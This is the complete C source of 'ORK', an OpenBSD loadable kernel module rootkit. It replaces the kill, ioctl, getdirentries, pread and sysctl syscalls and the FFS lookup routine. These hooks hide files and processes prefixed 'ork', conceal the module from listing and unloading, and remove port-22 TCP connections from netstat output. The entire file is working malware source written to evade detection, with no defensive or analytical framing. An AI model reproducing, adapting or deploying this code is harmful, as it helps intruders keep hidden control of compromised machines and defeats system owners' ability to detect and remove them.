/* OpenBSD RootKit (ORK)
 * Copyright (C) 2004 Meder Kydyraliev <meder@areopag.net>
 * May be distributed under GPL license, see COPYING for details.
 * see README!
 * TODO:
 *	- cleanup includes;
 *	- performance;
 *	- check how NULL syms pointer affect kernel;
 */
#include <sys/param.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/exec.h>
#include <sys/malloc.h>
#include <sys/lkm.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/namei.h>
#include <sys/vnode.h>
#include <sys/sysctl.h>
#include <sys/ioccom.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/syscallargs.h>
#include <sys/proc.h>
//#include <sys/signal.h>
#include <sys/queue.h>
#include <dirent.h>
#include <limits.h>
#include <net/if.h>
#include <sys/mbuf.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <net/route.h>
#include <netinet/in_pcb.h>
//#include <arpa/inet.h>
#include <string.h>
#include <nlist.h>
#include <fcntl.h>

/* print debugging messages */
//#define DEBUG

#define HIDE_PREFIX "ork"	/* files that start with that prefix are hidden */
#define LKM_NAME "ork"		/* name of our LKM */
#define HIDE_PREFIX_LEN strlen(HIDE_PREFIX)
#define HIDDEN_PORT 22		/* conns/state/etc to/from this port are hidden */

/* 
 * GENERIC has 'option DDB' by default.
 * stop following message from being displayed:
 * DDB: symbols added: blah
 */
#define DDB

/* globals */
static int ournum=-1;				/* module's slot number */
static char *savedsyms;				/* saved value of lkm_table's syms ptr */
static u_short hidden_port;			/* secret port in network byte order */
extern struct inpcbtable tcbtable;	/* TCP control block table */

typedef int     vop_t __P((void *));
extern vop_t **ffs_vnodeop_p;

/* some external funcs that we need */
extern int lkmexists __P((struct lkm_table *));

/* "fixed" versions of calls */
int new_kill __P((struct proc *pp, void *uap, register_t *retval));
int new_ioctl __P((struct proc *pp, void *uap, register_t *retval));
int new_getdirentries __P((struct proc *pp, void *uap, register_t *retval));
int new_pread __P((struct proc *pp, void *uap, register_t *retval));
int new_sysctl __P((struct proc *pp, void *uap, register_t *retval));
int new_ffs_lookup (void *v);

/* old values */
sy_call_t *old_ioctl;
sy_call_t *old_kill;
sy_call_t *old_getdirentries;
sy_call_t *old_pread;
sy_call_t *old_sysctl;

static vop_t *old_ffs_lookup;

MOD_MISC(LKM_NAME)

int
dummy_handler(lkmtp, cmd)
	int cmd;
	struct lkm_table *lkmtp;
{
         switch(cmd) {
         case LKM_E_LOAD:
				if (lkmexists(lkmtp))
					return EEXIST;
				hidden_port = htons(HIDDEN_PORT);
				/* what is our slot */
				ournum = lkmtp->id;
				/* save old kill, ioctl, getdirentries, pread, sysctl
				 * syscall entries and lookup function of FFS filesystem
				 */
				old_ioctl = sysent[SYS_ioctl].sy_call;
				old_kill = sysent[SYS_kill].sy_call;
				old_getdirentries = sysent[SYS_getdirentries].sy_call;
				old_pread= sysent[SYS_pread].sy_call;
				old_sysctl= sysent[SYS___sysctl].sy_call;
				old_ffs_lookup = ffs_vnodeop_p[VOFFSET(vop_lookup)];
				/* put our version of syscalls in :) */
				sysent[SYS_kill].sy_call = new_kill;
				sysent[SYS_ioctl].sy_call = new_ioctl;
				sysent[SYS_pread].sy_call = new_pread;
				sysent[SYS___sysctl].sy_call = new_sysctl;
				ffs_vnodeop_p[VOFFSET(vop_lookup)] = (vop_t *) new_ffs_lookup; 
				sysent[SYS_getdirentries].sy_call = new_getdirentries;
#ifdef DDB
				/* make sure there is no 
				 * DDB: symbols added: blah
				 * message
				 */
				savedsyms = lkmtp->syms;
				lkmtp->syms = NULL;
#endif
                break;

         case LKM_E_UNLOAD:
				/* restore the original values */
				sysent[SYS_kill].sy_call = old_kill;
				sysent[SYS_ioctl].sy_call = old_ioctl;
				sysent[SYS_pread].sy_call = old_pread;
				sysent[SYS___sysctl].sy_call = old_sysctl;
				sysent[SYS_getdirentries].sy_call = old_getdirentries;
				ffs_vnodeop_p[VOFFSET(vop_lookup)] = old_ffs_lookup;
                break;
         }
         return(0);
}

int
ork(lkmtp, cmd, ver)
         struct lkm_table *lkmtp;
         int cmd;
         int ver;
{
         DISPATCH(lkmtp, cmd, ver, dummy_handler, dummy_handler, lkm_nofunc)
}

/* 
 * new_kill() - blocks signals to the PIDs that have 
 * HIDE_PREFIX in the path.
 */
int new_kill (struct proc *pp, void *uap, register_t *retval) {
	struct sys_kill_args *v = uap;
	struct proc *p;         
	p = allproc.lh_first; /* get the beginning of linked list */

		/* loop thorught the whole list of processes
		 * to find the name(path) of the one we need
		 * and then check if we should hide it
		 * Time complexity is bad (O(N))!!! Need to improve,
		 * wonder if there's O(1) way go get proc name?
		 */
		for (;p != 0; p=p->p_list.le_next) {
			if ((p->p_pid == SCARG(v, pid)) && 
				(!strncmp(p->p_comm, HIDE_PREFIX, HIDE_PREFIX_LEN))) {
				return (ESRCH);
			}
		}
        return old_kill(pp, uap, retval);
}

/*
 * new_ioctl() - hides ORK lkm from being viewed, stated or unloaded.
 * Even if other LKMs will be loaded, module should still be invisible.
 */
int new_ioctl (struct proc *pp, void *uap, register_t *retval) {

	int retv;
	struct sys_ioctl_args *argz=uap;
	/*
	 * arguments that are passed to ioctl when doing:
	 * LMSTAT, LMRESERV and LMUNLOAD respectively.
	 */
	struct lmc_stat lkminfo;
	struct lmc_resrv lkmreserv;
	struct lmc_unload lkmunload;

	if (SCARG(argz, com) == LMSTAT) {
		if ((copyin(SCARG(argz, data), &lkminfo, sizeof(lkminfo))) != 0){
			return EINVAL;
		}
		if (lkminfo.id >= ournum){
			/* they are doing stat on id
			 * that is equal or greater then
			 * our id (modules that were loaded
			 * after our lkm), so to be invisible
			 * we "fix" the id and call the original
			 * ioctl syscall and with "fixed" id
			 */
			/* fix */
			lkminfo.id++;
			copyout(&lkminfo, SCARG(argz, data), sizeof(lkminfo));
			if ((retv = old_ioctl(pp, uap, retval)) == EINVAL) {
				/* ok no another lkm after us
				 * just fix the id back to what it was
				 * and return EINVAL
				 */
				copyin(SCARG(argz, data), &lkminfo, sizeof(lkminfo));
				lkminfo.id--;
				copyout(&lkminfo, SCARG(argz, data), sizeof(lkminfo));
				return EINVAL;
			} else {
				/* ok had something decrement the id
				 * and  return the stat
				 */
				copyin(SCARG(argz, data), &lkminfo, sizeof(lkminfo));
				lkminfo.id--;
				copyout(&lkminfo, SCARG(argz, data), sizeof(lkminfo));
			}
		} else {
			/* doing just a modstat or modstat by name */
			if ((retv = old_ioctl(pp, uap, retval)) == EINVAL) {
				return EINVAL;
			}
			if ((copyin(SCARG(argz, data), &lkminfo, sizeof(lkminfo))) != 0){
				return EINVAL;
			}
			if (lkminfo.name && !(strncmp(lkminfo.name, LKM_NAME, strlen(LKM_NAME)))) {
				return ENOENT;
			}
			/* check if we need to fix the id */
			if (lkminfo.id > ournum)
				lkminfo.id--;
			if ((copyout(&lkminfo, SCARG(argz, data), sizeof(lkminfo))) != 0) 
				return EINVAL;
		}
		return retv;
	} else if (SCARG(argz, com) == LMRESERV) {
		retv = old_ioctl(pp, uap, retval);
		if ((copyin(SCARG(argz, data), &lkmreserv, sizeof(lkmreserv))) != 0) 
			return EINVAL;
		/* check if we need to fix the id */
		if (lkmreserv.slot > ournum){
			lkmreserv.slot--;
			if ((copyout(&lkmreserv, SCARG(argz, data), sizeof(lkmreserv))) != 0)
				return EINVAL;
		}
		return retv;
	} else if (SCARG(argz, com) == LMUNLOAD) {
		/* check if our module was referenced directly */
		if ((copyin(SCARG(argz, data), &lkmunload, sizeof(lkmunload))) != 0)
			return EINVAL;
		if (lkmunload.id == ournum) 
			return EINVAL;
		else if (lkmunload.name && !(strncmp(lkmunload.name, LKM_NAME, strlen(LKM_NAME))))
			return ENOENT;
	}
	return old_ioctl(pp, uap, retval);
}
/*
 * new_ffs_lookup() - is a "fixed" version of a lookup operation 
 * of FFS VOP table. Advantage of this approach is that we do not
 * need to replace open(), stat() etc system calls as at the end
 * lookup function of underlying filesystem will be called
 */
int new_ffs_lookup (void *v) {
	struct vop_lookup_args *argz = v;	
	struct componentname *cmt = argz->a_cnp;
	if (!(strncmp(cmt->cn_nameptr, HIDE_PREFIX, HIDE_PREFIX_LEN)))
		return ENOENT;
	else
		return old_ffs_lookup(v);

}

/*
 * new_getdirentries() - system call also hides files from the directory
 * listing done by 'ls'. After original system call has returned the 
 * file listing of the directory, function loops through that list,
 * earasing entries that we want to hide
 */
int new_getdirentries (struct proc *pp, void *uap, register_t *retval) {

	struct sys_getdirentries_args *argz=uap;
	struct dirent *drnt;
	int err, bytesret, iii, incr=0;
	char buf[SCARG(argz, count)];

	err = old_getdirentries(pp, uap, retval);
	iii = *retval;
	if (err != 0)
		return err;

	/* ok now we loop through the list returned by
	 * original getdirentries() and earase our
	 * warez from it
	 */

	/* bytes actually returned by getdirentries() */
	bytesret = *retval;
	err = copyin(SCARG(argz, buf), buf, sizeof(buf));
	if (err){
		// restore what was there originally
		// less chances of being detected ?
		*retval = iii;
		return err;
	}
	for (iii=0; iii < bytesret; iii+=incr){
		drnt = (struct dirent *) ((buf+iii));
		incr = drnt->d_reclen;
		if (!(strncmp(drnt->d_name, HIDE_PREFIX, HIDE_PREFIX_LEN))) {
			/* ok we got a file that we need to hide
			 * we will overwrite the entry with whatever follows
			 * dirent struct, that we are hiding, if there's nothing
			 * then we simply memset it w/ 0's, and in any case we fix
			 * the 'retval'
			 */
			memset(buf+iii, 0, drnt->d_reclen);
			memcpy(buf+iii, buf+iii+incr, bytesret - (iii+incr));
			*retval = bytesret = bytesret - incr;
			if (iii < bytesret) {
				incr = 0;
			}
		} 
	}
	err = copyout(buf, SCARG(argz, buf), sizeof(buf));
	return err;
}

/*
 * new_pread() - hides TCP connections to/from HIDDEN_PORT.
 * netstat use KVM routines to access "_tcbtable" symbol.
 * 'tcbtable' itself is a circular linked-list. What netstat
 * does is finds address of '_tcbtable' symbol, reads the 'head'
 * of linked-list, and then loops through the linked list.
 * kvm_read() routine uses pread() to read /dev/kmem, so that's
 * where our new_pread() comes into play.
 * Function works by keeping track of series of pread() calls in
 * a very primitive way: it saves the next offset to be read by
 * next call to pread(). Once next node to be read will be an
 * entry for the port that we should hide, we repoint the 'cqe_next'
 * pointer two nodes ahead, and save current node in 'prev' so that
 * later one the next call we can modify the 'cqe_prev' pointer to
 * pass the check performed by netstat.
 */
int new_pread(struct proc *pp, void *uap, register_t *retval) {
	struct sys_pread_args *v = uap;
	unsigned int offset = SCARG(v, offset);
	int retv;
	struct inpcbtable tbl;
	static struct inpcb *pcbptr=NULL, *next=NULL, *prev=NULL, *hidden=NULL;
	struct inpcb *tmp;
	struct inpcb inp;

	/* very first call to the head of tcbtable linked-list */
	if (offset == (int) &tcbtable) {
		retv = old_pread(pp, uap, retval);
		if ((copyin(SCARG(v, buf), &tbl, sizeof(tbl))) != 0) {
			printf("Error copying\n");
			return retv;
		}
		/* set the pointers to keep track of successive pread() calls */
		pcbptr = tbl.inpt_queue.cqh_first;
		next = pcbptr->inp_queue.cqe_next;
		return retv;
	} else if (pcbptr && offset == (int)pcbptr) { /* node is pread() */
		retv = old_pread(pp, uap, retval);
		if ((copyin(SCARG(v, buf), &inp, sizeof(inp))) != 0) {
			printf("Error copying\n");
			return retv;
		}
		/* shall we hide it? */
		if (next->inp_lport == hidden_port || next->inp_fport == hidden_port) {
			/* make sure the 'next' pointer points
			 * to the next node after the one we are hiding
			 * XXX: node for port is repeated twice ? why?
			 */
			tmp = next->inp_queue.cqe_next;
			/* save necessary pointers */
			hidden = tmp;
			prev = pcbptr;
			pcbptr = tmp;
			/* repoint cqe_next skipping hidden port */
			inp.inp_queue.cqe_next = tmp->inp_queue.cqe_next;
			copyout(&inp, SCARG(v, buf), sizeof(inp));
		}
		if (inp.inp_queue.cqe_prev == hidden) {
			/* netstat makes a check to make sure that cqe_prev
			 * pointer acutally point to the 'prev' node, so we
			 * fix that here
			 */
			inp.inp_queue.cqe_prev = prev;
			copyout(&inp, SCARG(v, buf), sizeof(inp));
		}
		pcbptr = pcbptr->inp_queue.cqe_next;
		next = pcbptr->inp_queue.cqe_next;
		return retv;
	} else 
		return old_pread(pp, uap, retval);
}

/*
 * new_sysctl() - hides processes that start with HIDDEN_PREFIX.
 * 'ps' uses kvm_getproc2() which calls kvm_getprocs() that uses
 * sysctl() in the end. The idea here is simple, we catch KERN_PROC
 * in MIB, on the second call when 'old' pointer is not NULL (i.e.
 * some space was allocated, loop through the list and earase
 * entries that we want to hide.
 */
int new_sysctl(struct proc *pp, void *uap, register_t *retval) {
	struct sys___sysctl_args *v = uap;
	int mib[CTL_MAXNAME], retv, len, nentries, k=0, bak;
	char *m, *ptr;
	struct kinfo_proc *kip;

	/* sanity check */
	if (SCARG(v, namelen) > CTL_MAXNAME || SCARG(v, namelen) < 2)
		return EINVAL;
	retv = copyin (SCARG(v, name), mib, SCARG(v, namelen)*sizeof(int));
	if (retv)
		return retv;
	if (mib[1] == KERN_PROC) {
		retv = old_sysctl(pp, uap, retval);
		if(copyin(SCARG(v, oldlenp), &len, sizeof(len))){
			return retv;
		}
		/* number of kinfo_proc structs in buffer */
		nentries = len/sizeof(*kip); 
		if (SCARG(v, old) != NULL) { /* second call */
			/* copy all kinfo structures */
			bak = len;
			m = (char *) malloc (len, M_PROC, M_NOWAIT);
			ptr = m;
			if (copyin(SCARG(v, old), m, len)) {
				return retv;
			}
			/* loop through the kinfo_proc structures in the buffer
			 * and earase the ones we want
			 */
			for (k=0; k < nentries;) {
				kip = (struct kinfo_proc *) ptr;
				if (!strncmp(kip->kp_proc.p_comm, HIDE_PREFIX, HIDE_PREFIX_LEN)) {
					/* hiding */
					memset(ptr, 0, sizeof(*kip));
					memcpy(ptr, ptr+sizeof(*kip), (nentries-(k+1))*sizeof(*kip));
					len-=sizeof(*kip);
				} else {
					ptr+=sizeof(*kip);
					k++;
				}
			}
			/* return results to the user */
			if (copyout(m, SCARG(v, old), bak))
				return retv;
			if (copyout(&len, SCARG(v, oldlenp), sizeof(len)))
				return retv;
			free (m, M_PROC);
		}
		return retv;
	}
	return old_sysctl(pp, uap, retval);
}
